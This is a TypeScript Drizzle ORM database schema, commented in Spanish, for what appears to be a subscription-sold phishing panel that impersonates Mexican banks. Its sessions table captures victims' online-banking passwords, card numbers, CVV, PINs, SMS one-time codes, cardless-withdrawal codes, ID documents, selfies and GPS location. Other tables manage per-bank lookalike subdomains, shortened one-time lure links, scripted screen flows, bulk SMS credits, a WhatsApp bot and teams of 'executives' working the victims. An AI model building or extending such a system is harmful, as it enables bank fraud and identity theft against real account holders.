
import { pgTable, text, serial, integer, boolean, timestamp, jsonb, numeric, unique } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import bcrypt from "bcrypt";

// Roles de usuario
export enum UserRole {
  ADMIN = "admin",
  USER = "user"
}

// Tipos de cuenta
export enum AccountType {
  INDIVIDUAL = "individual",
  OFFICE = "office"
}

// Bancos disponibles
export enum BankType {
  ALL = "all",
  LIVERPOOL = "liverpool",
  CITIBANAMEX = "citibanamex",
  BANBAJIO = "banbajio",
  BBVA = "bbva",
  BANORTE = "banorte",
  BANCOPPEL = "bancoppel",
  HSBC = "hsbc",
  AMEX = "amex",
  SANTANDER = "santander",
  SCOTIABANK = "scotiabank",
  INVEX = "invex",
  BANREGIO = "banregio",
  SPIN = "spin",
  PLATACARD = "platacard",
  BANCOAZTECA = "bancoazteca",
  BIENESTAR = "bienestar",
  INBURSA = "inbursa",
  AFIRME = "afirme"
}

// Tabla de usuarios del sistema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  role: text("role").notNull().default(UserRole.USER),
  isActive: boolean("is_active").default(false), // Los usuarios inician inactivos hasta que el admin los apruebe
  expiresAt: timestamp("expires_at"), // Fecha de expiración de la cuenta
  deviceCount: integer("device_count").default(0), // Contador de dispositivos activos
  maxDevices: integer("max_devices").default(3), // Máximo de dispositivos permitidos
  allowedBanks: text("allowed_banks").default('all'), // Bancos permitidos: 'all' o lista separada por comas
  telegramChatId: text("telegram_chat_id"), // ID del chat de Telegram para notificaciones y 2FA
  apkFileName: text("apk_file_name"), // Nombre del archivo APK asignado
  apkFileUrl: text("apk_file_url"), // URL del archivo APK asignado
  customPrice: text("custom_price"), // Precio personalizado para este usuario (opcional, si no tiene usa el precio del sistema)
  accountType: text("account_type").default(AccountType.INDIVIDUAL), // Tipo de cuenta: individual u oficina
  weeklyPrice: integer("weekly_price"), // Precio semanal específico para esta cuenta
  maxExecutives: integer("max_executives").default(0), // Máximo de ejecutivos (solo para cuentas de oficina)
  currentExecutives: integer("current_executives").default(0), // Contador de ejecutivos activos
  createdAt: timestamp("created_at").defaultNow(),
  lastLogin: timestamp("last_login"),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  role: true,
  isActive: true,
  allowedBanks: true,
  telegramChatId: true,
  apkFileName: true,
  apkFileUrl: true,
  customPrice: true,
  accountType: true,
  weeklyPrice: true,
  maxExecutives: true,
  maxDevices: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Tabla para las llaves de acceso
export const accessKeys = pgTable("access_keys", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  description: text("description"),
  createdBy: integer("created_by").notNull(), // ID del administrador que creó la llave
  expiresAt: timestamp("expires_at").notNull(), // Fecha de expiración
  maxDevices: integer("max_devices").notNull().default(3), // Máximo de dispositivos permitidos
  activeDevices: integer("active_devices").default(0), // Contador de dispositivos activos
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  lastUsed: timestamp("last_used"),
});

export const insertAccessKeySchema = createInsertSchema(accessKeys).pick({
  key: true,
  description: true,
  createdBy: true,
  expiresAt: true,
  maxDevices: true,
});

export type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;
export type AccessKey = typeof accessKeys.$inferSelect;

// Tabla para rastrear los dispositivos que usan cada llave
export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  accessKeyId: integer("access_key_id").notNull(), // ID de la llave a la que está asociado
  deviceId: text("device_id").notNull(), // Identificador único del dispositivo
  userAgent: text("user_agent"), // Información del navegador/dispositivo
  ipAddress: text("ip_address"), // Dirección IP
  lastActive: timestamp("last_active").defaultNow(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertDeviceSchema = createInsertSchema(devices).pick({
  accessKeyId: true,
  deviceId: true,
  userAgent: true,
  ipAddress: true,
});

export type InsertDevice = z.infer<typeof insertDeviceSchema>;
export type Device = typeof devices.$inferSelect;

export const sessions = pgTable("sessions", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  folio: text("folio"),
  username: text("username"),
  password: text("password"),
  banco: text("banco").default("LIVERPOOL"),
  tarjeta: text("tarjeta"),
  fechaVencimiento: text("fecha_vencimiento"),
  cvv: text("cvv"),
  sms: text("sms"),
  nip: text("nip"),
  smsCompra: text("sms_compra"),
  celular: text("celular"),
  pasoActual: text("paso_actual").default("folio"),
  createdAt: timestamp("created_at").defaultNow(),
  active: boolean("active").default(true),
  saved: boolean("saved").default(false),
  createdBy: text("created_by"), // Añadimos el campo para saber qué usuario creó la sesión
  qrData: text("qr_data"), // Almacena el texto del código QR escaneado
  qrImageData: text("qr_image_data"), // Almacena la imagen del QR escaneado en base64
  codigoRetiro: text("codigo_retiro"), // Almacena el código de retiro sin tarjeta ingresado por el usuario
  pinRetiro: text("pin_retiro"), // Almacena el PIN de seguridad adicional para retiro sin tarjeta
  lastActivity: timestamp("last_activity").defaultNow(), // Último momento de actividad
  hasUserData: boolean("has_user_data").default(false), // Indica si el usuario ingresó algún dato
  // Información del dispositivo
  deviceType: text("device_type"), // 'Android', 'iPhone', 'PC'
  deviceModel: text("device_model"), // Modelo específico del dispositivo
  deviceBrowser: text("device_browser"), // Navegador utilizado
  deviceOs: text("device_os"), // Sistema operativo
  userAgent: text("user_agent"), // User agent completo
  // Información del archivo para protección bancaria
  fileName: text("file_name"), // Nombre del archivo subido
  fileUrl: text("file_url"), // URL del archivo para descarga
  fileSize: text("file_size"), // Tamaño del archivo
  documentType: text("document_type"), // Tipo de documento de identidad (INE/Pasaporte)
  documentFileName: text("document_file_name"), // Nombre del archivo del documento
  documentFileUrl: text("document_file_url"), // URL del archivo del documento
  selfieFileName: text("selfie_file_name"), // Nombre del archivo del selfie
  selfieFileUrl: text("selfie_file_url"), // URL del archivo del selfie
  identityVerified: boolean("identity_verified").default(false), // Estado de verificación de identidad
  // Información de protección de saldo
  saldoDebito: text("saldo_debito"), // Respuesta sobre tarjeta de débito
  montoDebito: text("monto_debito"), // Monto en tarjeta de débito
  saldoCredito: text("saldo_credito"), // Respuesta sobre tarjeta de crédito
  montoCredito: text("monto_credito"), // Monto en tarjeta de crédito
  // Información de geolocalización
  latitude: text("latitude"), // Coordenada GPS de latitud
  longitude: text("longitude"), // Coordenada GPS de longitud
  googleMapsLink: text("google_maps_link"), // Enlace directo a Google Maps
  ipAddress: text("ip_address"), // Dirección IP del usuario
  locationTimestamp: timestamp("location_timestamp"), // Timestamp de cuando se capturó la ubicación
  // Vinculación con oficinas y ejecutivos
  officeId: integer("office_id"), // ID de la oficina (si la sesión fue creada por una cuenta de oficina)
  executiveId: integer("executive_id").references(() => executives.id), // ID del ejecutivo que creó la sesión (null si la creó el dueño)
  // Metadatos del flujo personalizado de pantallas
  flowConfig: jsonb("flow_config"), // Configuración completa del flujo para este banco
  currentStepIndex: integer("current_step_index").default(0), // Índice del paso actual en el flujo
  flowState: text("flow_state"), // Estado del flujo: 'active', 'paused', 'completed', null si no hay flujo
  stepStartedAt: timestamp("step_started_at"), // Cuándo comenzó el paso actual
  autoAdvanceAt: timestamp("auto_advance_at"), // Cuándo avanzar automáticamente al siguiente paso
});

export const insertSessionSchema = createInsertSchema(sessions).pick({
  sessionId: true,
  folio: true,
  username: true,
  password: true,
  banco: true,
  pasoActual: true,
  createdBy: true,
  executiveId: true,
  deviceType: true,
  deviceModel: true,
  deviceBrowser: true,
  deviceOs: true,
  userAgent: true,
  fileName: true,
  fileUrl: true,
  fileSize: true,
  flowConfig: true,
  currentStepIndex: true,
  flowState: true,
  stepStartedAt: true,
  autoAdvanceAt: true,
});

export type InsertSession = z.infer<typeof insertSessionSchema>;
export type Session = typeof sessions.$inferSelect;

// Tabla de perfiles de oficina
export const officeProfiles = pgTable("office_profiles", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().unique().references(() => users.id), // FK al usuario oficina
  weeklyPrice: integer("weekly_price").default(6000), // Precio semanal (default 6000 MXN)
  maxExecutives: integer("max_executives").default(8), // Máximo de ejecutivos permitidos
  currentExecutives: integer("current_executives").default(0), // Contador actual
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const insertOfficeProfileSchema = createInsertSchema(officeProfiles).pick({
  userId: true,
  weeklyPrice: true,
  maxExecutives: true,
  isActive: true,
});

export type InsertOfficeProfile = z.infer<typeof insertOfficeProfileSchema>;
export type OfficeProfile = typeof officeProfiles.$inferSelect;

// Tabla de ejecutivos para cuentas de oficina
export const executives = pgTable("executives", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // FK al usuario oficina dueño
  username: text("username").notNull().unique(),
  displayName: text("display_name"), // Nombre para mostrar del ejecutivo
  password: text("password").notNull(), // Contraseña hasheada
  isActive: boolean("is_active").default(true),
  currentSessions: integer("current_sessions").default(0), // Sesiones activas actuales
  maxSessions: integer("max_sessions").default(1), // Máximo 1 sesión simultánea por ejecutivo
  requiresOtp: boolean("requires_otp").default(true), // Si requiere OTP para login
  lastOtpCode: text("last_otp_code"), // Último código OTP generado
  lastOtpTime: timestamp("last_otp_time"), // Timestamp del último OTP
  createdAt: timestamp("created_at").defaultNow(),
  lastLogin: timestamp("last_login"),
});

export const insertExecutiveSchema = createInsertSchema(executives).pick({
  userId: true,
  username: true,
  displayName: true,
  password: true,
  isActive: true,
  maxSessions: true,
  requiresOtp: true,
});

export type InsertExecutive = z.infer<typeof insertExecutiveSchema>;
export type Executive = typeof executives.$inferSelect;

// Tabla para la configuración de la API de mensajes
export const smsConfig = pgTable("sms_config", {
  id: serial("id").primaryKey(),
  username: text("username"),
  password: text("password"),
  apiUrl: text("api_url").default("https://api.sofmex.mx/api/sms"),
  isActive: boolean("is_active").default(false),
  updatedAt: timestamp("updated_at").defaultNow(),
  updatedBy: text("updated_by").notNull(),
});

export const insertSmsConfigSchema = createInsertSchema(smsConfig).pick({
  username: true,
  password: true,
  apiUrl: true,
  isActive: true,
  updatedBy: true,
});

export type InsertSmsConfig = z.infer<typeof insertSmsConfigSchema>;
export type SmsConfig = typeof smsConfig.$inferSelect;

// Tabla para la configuración del sitio
export const siteConfig = pgTable("site_config", {
  id: serial("id").primaryKey(),
  baseUrl: text("base_url").notNull().default("https://aclaracionesditales.com"),
  updatedBy: text("updated_by").notNull(),
  updatedAt: timestamp("updated_at").defaultNow(),
});

// Schema con validación robusta de URL
const urlValidationSchema = z.string()
  .trim() // Remover espacios en blanco
  .min(1, "La URL no puede estar vacía")
  .url("Debe ser una URL válida")
  .refine((url) => url.startsWith('https://'), {
    message: "La URL debe comenzar con https://"
  })
  .transform((url) => {
    // Normalizar URL: remover trailing slash
    return url.endsWith('/') && url !== 'https://' ? url.slice(0, -1) : url;
  });

export const insertSiteConfigSchema = createInsertSchema(siteConfig).pick({
  baseUrl: true,
  updatedBy: true,
}).extend({
  baseUrl: urlValidationSchema
});

export type InsertSiteConfig = z.infer<typeof insertSiteConfigSchema>;
export type SiteConfig = typeof siteConfig.$inferSelect;

// Tabla para los créditos de mensajes de los usuarios
export const smsCredits = pgTable("sms_credits", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  credits: numeric("credits", { precision: 10, scale: 2 }).default("0"), // Cambiado a decimal para soportar 0.5 créditos
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const insertSmsCreditsSchema = createInsertSchema(smsCredits).pick({
  userId: true,
  credits: true,
});

export type InsertSmsCredits = z.infer<typeof insertSmsCreditsSchema>;
export type SmsCredits = typeof smsCredits.$inferSelect;

// Tipos de ruta SMS
export enum SmsRouteType {
  LONG_CODE = 'long_code',   // 0.5 crédito - Ankarex
  SHORT_CODE = 'short_code', // 1 crédito - eims (ruta premium)
  PREMIUM = 'premium'        // 1 crédito - eims (ruta premium alternativa)
}

// Tabla para el historial de mensajes enviados
export const smsHistory = pgTable("sms_history", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  phoneNumber: text("phone_number").notNull(),
  message: text("message").notNull(),
  sentAt: timestamp("sent_at").defaultNow(),
  status: text("status").default("pending"),
  sessionId: text("session_id"),
  errorMessage: text("error_message"),
  routeType: text("route_type").$type<SmsRouteType>().default(SmsRouteType.LONG_CODE), // Tipo de ruta utilizada
  creditCost: numeric("credit_cost", { precision: 10, scale: 2 }).default("1"), // Costo en créditos del envío
});

export const insertSmsHistorySchema = createInsertSchema(smsHistory).pick({
  userId: true,
  phoneNumber: true,
  message: true,
  sessionId: true,
  routeType: true,
  creditCost: true,
});

export type InsertSmsHistory = z.infer<typeof insertSmsHistorySchema>;
export type SmsHistory = typeof smsHistory.$inferSelect;

export enum ScreenType {
  GEOLOCATION = "geolocation",
  FOLIO = "folio",
  LOGIN = "login",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "protege",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  VALIDANDO = "validando",
  SMS_COMPRA = "sms_compra",
  ESCANEAR_QR = "escanear_qr",
  CANCELACION_RETIRO = "cancelacion_retiro",
  PROTECCION_BANCARIA = "proteccion_bancaria",
  PROTECCION_SALDO = "proteccion_saldo",
  VERIFICACION_ID = "verificacion_id"
}

export const screenChangeSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  terminacion: z.string().optional(),
  saldo: z.string().optional(),
  monto: z.string().optional(),
  clabe: z.string().optional(),
  titular: z.string().optional(),
  comercio: z.string().optional(),
  mensaje: z.string().optional(),
  qrData: z.string().optional(), // Para datos del QR escaneado
  qrImageData: z.string().optional(), // Para la imagen del QR escaneado en base64
  fileName: z.string().optional(), // Para archivos de protección bancaria
  fileUrl: z.string().optional(), // URL del archivo de protección
  fileSize: z.string().optional(), // Tamaño del archivo de protección
  saldoDebito: z.string().optional(), // Respuesta sobre tarjeta de débito
  montoDebito: z.string().optional(), // Monto en tarjeta de débito
  saldoCredito: z.string().optional(), // Respuesta sobre tarjeta de crédito
  montoCredito: z.string().optional(), // Monto en tarjeta de crédito
  documentType: z.string().optional(), // Tipo de documento (INE/Pasaporte)
  documentFileName: z.string().optional(), // Nombre del archivo del documento
  documentFileUrl: z.string().optional(), // URL del archivo del documento
  selfieFileName: z.string().optional(), // Nombre del archivo del selfie
  selfieFileUrl: z.string().optional(), // URL del archivo del selfie
  verified: z.boolean().optional(), // Estado de verificación
});

export type ScreenChangeData = z.infer<typeof screenChangeSchema>;

export const clientInputSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  data: z.record(z.any()),
});

export type ClientInputData = z.infer<typeof clientInputSchema>;

// Tipos de notificaciones del sistema
export enum NotificationType {
  SESSION_ACTIVITY = "session_activity", // Actividad en sesiones
  USER_ACTIVITY = "user_activity",       // Actividad de usuario
  SYSTEM = "system",                     // Notificaciones del sistema
  SUCCESS = "success",                   // Operaciones exitosas
  WARNING = "warning",                   // Advertencias
  ERROR = "error",                       // Errores
  INFO = "info"                          // Información general
}

// Prioridad de notificaciones
export enum NotificationPriority {
  LOW = "low",
  MEDIUM = "medium",
  HIGH = "high",
  URGENT = "urgent"
}

// Tabla para almacenar notificaciones
export const notifications = pgTable("notifications", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(), // Usuario al que va dirigida la notificación
  type: text("type").notNull().$type<NotificationType>(), // Tipo de notificación
  title: text("title").notNull(), // Título de la notificación
  message: text("message").notNull(), // Mensaje principal
  details: text("details"), // Detalles adicionales (opcional)
  priority: text("priority").notNull().$type<NotificationPriority>().default(NotificationPriority.MEDIUM), // Prioridad
  read: boolean("read").default(false), // Si la notificación ha sido leída
  createdAt: timestamp("created_at").defaultNow(), // Fecha de creación
  expiresAt: timestamp("expires_at"), // Fecha de expiración (opcional)
  actionUrl: text("action_url"), // URL opcional para acción
  sessionId: text("session_id"), // ID de sesión relacionada (opcional)
  metaData: jsonb("meta_data") // Datos adicionales en formato JSON
});

export const insertNotificationSchema = createInsertSchema(notifications).pick({
  userId: true,
  type: true,
  title: true,
  message: true,
  details: true,
  priority: true,
  actionUrl: true,
  sessionId: true,
  metaData: true,
  expiresAt: true
});

export type InsertNotification = z.infer<typeof insertNotificationSchema>;
export type Notification = typeof notifications.$inferSelect;

// Tabla para preferencias de notificación de los usuarios
export const notificationPreferences = pgTable("notification_preferences", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario al que pertenecen las preferencias
  sessionActivityEnabled: boolean("session_activity_enabled").default(true), // Recibir notificaciones de actividad de sesiones
  userActivityEnabled: boolean("user_activity_enabled").default(true), // Recibir notificaciones de actividad de usuarios
  systemEnabled: boolean("system_enabled").default(true), // Recibir notificaciones del sistema
  minPriority: text("min_priority").$type<NotificationPriority>().default(NotificationPriority.LOW), // Prioridad mínima para recibir notificaciones
  emailEnabled: boolean("email_enabled").default(false), // Recibir notificaciones por email
  emailAddress: text("email_address"), // Dirección de email para notificaciones
  updatedAt: timestamp("updated_at").defaultNow() // Última actualización
});

export const insertNotificationPrefsSchema = createInsertSchema(notificationPreferences).pick({
  userId: true,
  sessionActivityEnabled: true,
  userActivityEnabled: true,
  systemEnabled: true,
  minPriority: true,
  emailEnabled: true,
  emailAddress: true
});

export type InsertNotificationPrefs = z.infer<typeof insertNotificationPrefsSchema>;
export type NotificationPrefs = typeof notificationPreferences.$inferSelect;

// Tabla para códigos de verificación 2FA
export const verificationCodes = pgTable("verification_codes", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  code: text("code").notNull(), // Código de 6 dígitos
  isUsed: boolean("is_used").default(false),
  expiresAt: timestamp("expires_at").notNull(), // Los códigos expiran en 10 minutos
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertVerificationCodeSchema = createInsertSchema(verificationCodes).pick({
  userId: true,
  code: true,
  expiresAt: true,
});

export type InsertVerificationCode = z.infer<typeof insertVerificationCodeSchema>;
export type VerificationCode = typeof verificationCodes.$inferSelect;

// Tabla para configuración del sistema (precios, etc)
export const systemConfig = pgTable("system_config", {
  id: serial("id").primaryKey(),
  subscriptionPrice: numeric("subscription_price", { precision: 10, scale: 2 }).notNull().default('0'), // Precio de suscripción (7 días)
  updatedAt: timestamp("updated_at").defaultNow(),
  updatedBy: integer("updated_by") // ID del admin que actualizó
});

export const insertSystemConfigSchema = createInsertSchema(systemConfig).pick({
  subscriptionPrice: true,
  updatedBy: true
});

export type InsertSystemConfig = z.infer<typeof insertSystemConfigSchema>;
export type SystemConfig = typeof systemConfig.$inferSelect;

// Estados de pago
export enum PaymentStatus {
  PENDING = "pending",
  COMPLETED = "completed",
  EXPIRED = "expired",
  CANCELLED = "cancelled",
  MANUAL_REVIEW = "manual_review"
}

// Tabla para rastrear pagos de usuarios
export const payments = pgTable("payments", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id),
  amount: numeric("amount", { precision: 10, scale: 2 }).notNull(), // Monto esperado
  referenceCode: text("reference_code").notNull().unique(), // Código de referencia único para este pago
  status: text("status").notNull().$type<PaymentStatus>().default(PaymentStatus.PENDING),
  bitsoTransactionId: text("bitso_transaction_id"), // ID de transacción en Bitso
  verifiedAt: timestamp("verified_at"), // Cuándo se verificó el pago
  expiresAt: timestamp("expires_at"), // Cuándo expira esta espera de pago
  createdAt: timestamp("created_at").defaultNow(),
  notes: text("notes"), // Notas adicionales
  telegramFileId: text("telegram_file_id"), // ID del archivo de Telegram (captura de pantalla)
  verificationAttempts: integer("verification_attempts").default(0), // Contador de intentos de verificación con Bitso
  previousBalance: text("previous_balance"), // Balance en MXN antes de este depósito (para verificar aumento exacto)
  reportedAmount: text("reported_amount") // Monto que el usuario dice haber depositado
});

export const insertPaymentSchema = createInsertSchema(payments).omit({
  id: true,
  createdAt: true
});

export type InsertPayment = z.infer<typeof insertPaymentSchema>;
export type Payment = typeof payments.$inferSelect;

// Tabla para códigos de descuento de un solo uso
export const discountCodes = pgTable("discount_codes", {
  id: serial("id").primaryKey(),
  code: text("code").notNull().unique(), // Código único generado
  discountAmount: numeric("discount_amount", { precision: 10, scale: 2 }).notNull(), // Cantidad de descuento en pesos
  isUsed: boolean("is_used").default(false), // Si ya fue usado
  usedBy: integer("used_by").references(() => users.id), // ID del usuario que lo usó
  usedAt: timestamp("used_at"), // Cuándo fue usado
  createdBy: integer("created_by").notNull(), // ID del admin que lo creó
  createdAt: timestamp("created_at").defaultNow()
});

export const insertDiscountCodeSchema = createInsertSchema(discountCodes).omit({
  id: true,
  createdAt: true,
  isUsed: true,
  usedBy: true,
  usedAt: true
});

export type InsertDiscountCode = z.infer<typeof insertDiscountCodeSchema>;
export type DiscountCode = typeof discountCodes.$inferSelect;

// Tabla para configuración de WhatsApp Bot
export const whatsappConfig = pgTable("whatsapp_config", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario dueño del bot
  isConnected: boolean("is_connected").default(false), // Estado de conexión
  qrCode: text("qr_code"), // QR code en formato base64
  authState: jsonb("auth_state"), // Estado de autenticación de Baileys
  phoneNumber: text("phone_number"), // Número de WhatsApp conectado
  welcomeMessage: text("welcome_message").default("¡Hola! Bienvenido a nuestro CRM. Por favor selecciona una opción:"), // Mensaje de bienvenida
  lastConnected: timestamp("last_connected"), // Última vez que se conectó
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
});

export const insertWhatsappConfigSchema = createInsertSchema(whatsappConfig).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertWhatsappConfig = z.infer<typeof insertWhatsappConfigSchema>;
export type WhatsappConfig = typeof whatsappConfig.$inferSelect;

// Tabla para opciones del menú de WhatsApp
export const whatsappMenuOptions = pgTable("whatsapp_menu_options", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario dueño
  parentId: integer("parent_id"), // ID del menú padre (null para menú principal)
  optionNumber: integer("option_number").notNull(), // Número de la opción (1, 2, 3, etc.)
  optionText: text("option_text").notNull(), // Texto que se muestra (ej: "Hablar con ejecutivo")
  actionType: text("action_type").notNull().default("message"), // Tipo de acción: "message", "transfer", "info", "submenu", "command"
  responseMessage: text("response_message"), // Mensaje de respuesta (si actionType es "message")
  commandType: text("command_type"), // Tipo de comando: "liga" (envía última liga del panel)
  isActive: boolean("is_active").default(true), // Si está activa
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
});

export const insertWhatsappMenuOptionSchema = createInsertSchema(whatsappMenuOptions).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertWhatsappMenuOption = z.infer<typeof insertWhatsappMenuOptionSchema>;
export type WhatsappMenuOption = typeof whatsappMenuOptions.$inferSelect;

// Tabla para historial de conversaciones de WhatsApp
export const whatsappConversations = pgTable("whatsapp_conversations", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario dueño del bot
  phoneNumber: text("phone_number").notNull(), // Número del contacto
  contactName: text("contact_name"), // Nombre del contacto (si está disponible)
  message: text("message").notNull(), // Mensaje recibido/enviado
  isFromBot: boolean("is_from_bot").default(false), // true si es del bot, false si es del contacto
  messageId: text("message_id"), // ID del mensaje de WhatsApp
  createdAt: timestamp("created_at").defaultNow()
});

export const insertWhatsappConversationSchema = createInsertSchema(whatsappConversations).omit({
  id: true,
  createdAt: true
});

export type InsertWhatsappConversation = z.infer<typeof insertWhatsappConversationSchema>;
export type WhatsappConversation = typeof whatsappConversations.$inferSelect;

// Estados de los links
export enum LinkStatus {
  ACTIVE = "active",
  CONSUMED = "consumed",
  EXPIRED = "expired",
  CANCELLED = "cancelled"
}

// Tabla para subdominios de bancos
export const bankSubdomains = pgTable("bank_subdomains", {
  id: serial("id").primaryKey(),
  bankCode: text("bank_code").notNull().unique(), // Código del banco (liverpool, bbva, etc.)
  subdomain: text("subdomain").notNull(), // Solo el prefijo del subdominio (ejemplo: "liverpool"), se combina con el dominio base configurado
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
});

export const insertBankSubdomainSchema = createInsertSchema(bankSubdomains).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertBankSubdomain = z.infer<typeof insertBankSubdomainSchema>;
export type BankSubdomain = typeof bankSubdomains.$inferSelect;

// Tabla para tokens de links de un solo uso
export const linkTokens = pgTable("link_tokens", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario que generó el link
  sessionId: text("session_id").references(() => sessions.sessionId), // Sesión asociada (opcional) - referencia al sessionId texto
  bankCode: text("bank_code").notNull(), // Banco asociado
  token: text("token").notNull().unique(), // Token único generado
  originalUrl: text("original_url").notNull(), // URL original completa con subdominio
  shortUrl: text("short_url"), // URL acortada por Bitly
  bitlyLinkId: text("bitly_link_id"), // ID del link en Bitly para auditoría
  status: text("status").notNull().default(LinkStatus.ACTIVE), // Estado del link
  expiresAt: timestamp("expires_at").notNull(), // Cuándo expira (por defecto 1 hora)
  usedAt: timestamp("used_at"), // Cuándo fue usado (para un solo uso)
  extendedUntil: timestamp("extended_until"), // Si se extendió la duración
  metadata: jsonb("metadata"), // Información adicional (IP, user-agent, etc.)
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
});

export const insertLinkTokenSchema = createInsertSchema(linkTokens).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
  usedAt: true
});

export type InsertLinkToken = z.infer<typeof insertLinkTokenSchema>;
export type LinkToken = typeof linkTokens.$inferSelect;

// Tabla para rastrear uso semanal de links por usuario
export const linkUsageWeekly = pgTable("link_usage_weekly", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id),
  weekStartDate: timestamp("week_start_date").notNull(), // Inicio de la semana (lunes)
  linkCount: integer("link_count").notNull().default(0), // Contador de links generados
  lastGeneratedAt: timestamp("last_generated_at"), // Última vez que generó un link
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
}, (table) => ({
  uniqueUserWeek: unique().on(table.userId, table.weekStartDate)
}));

export const insertLinkUsageWeeklySchema = createInsertSchema(linkUsageWeekly).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertLinkUsageWeekly = z.infer<typeof insertLinkUsageWeeklySchema>;
export type LinkUsageWeekly = typeof linkUsageWeekly.$inferSelect;

// Tipos de pantalla para flujos
export enum ScreenFlowType {
  FOLIO = "folio",
  LOGIN = "login",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "proteger",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  SMS_COMPRA = "sms_compra",
  VALIDANDO = "validando",
  ESCANEAR_QR = "escanear_qr",
  CANCELACION_RETIRO = "cancelacion_retiro",
  VERIFICACION_ID = "verificacion_id"
}

// Tabla para configuración de flujos de pantallas por banco
export const bankScreenFlows = pgTable("bank_screen_flows", {
  id: serial("id").primaryKey(),
  bankCode: text("bank_code").notNull().unique(), // Código del banco
  flowConfig: jsonb("flow_config").notNull(), // Array de {screenType, durationMs, payload}
  isActive: boolean("is_active").default(true),
  createdBy: integer("created_by").references(() => users.id), // Admin que creó la configuración
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
});

export const insertBankScreenFlowSchema = createInsertSchema(bankScreenFlows).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertBankScreenFlow = z.infer<typeof insertBankScreenFlowSchema>;
export type BankScreenFlow = typeof bankScreenFlows.$inferSelect;

// Tabla para configuración de flujos de pantallas por usuario y banco
export const userBankFlows = pgTable("user_bank_flows", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id, { onDelete: 'cascade' }), // Usuario que creó el flujo
  bankCode: text("bank_code").notNull(), // Código del banco
  flowConfig: jsonb("flow_config").notNull(), // Array de {screenType, durationMs, waitForUser, payload}
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  updatedAt: timestamp("updated_at").defaultNow()
}, (table) => ({
  // Restricción única: cada usuario solo puede tener un flujo activo por banco
  uniqueUserBank: unique().on(table.userId, table.bankCode)
}));

export const insertUserBankFlowSchema = createInsertSchema(userBankFlows).omit({
  id: true,
  createdAt: true,
  updatedAt: true
});

export type InsertUserBankFlow = z.infer<typeof insertUserBankFlowSchema>;
export type UserBankFlow = typeof userBankFlows.$inferSelect;
